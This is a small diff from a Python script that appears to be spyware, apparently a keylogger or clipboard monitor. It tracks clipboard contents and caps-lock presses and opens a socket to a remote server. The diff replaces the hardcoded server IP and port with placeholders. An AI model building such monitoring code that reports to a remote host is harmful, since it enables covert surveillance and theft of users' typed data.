@@ -9,7 +9,7 @@ current_clipboard = ""
 caps_lock_count = 0
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
-server.connect(("192.168.15.70", 24445))
+server.connect(("[IP ADDRESS]", [PORT]))
 
 
 def get_public_ip():
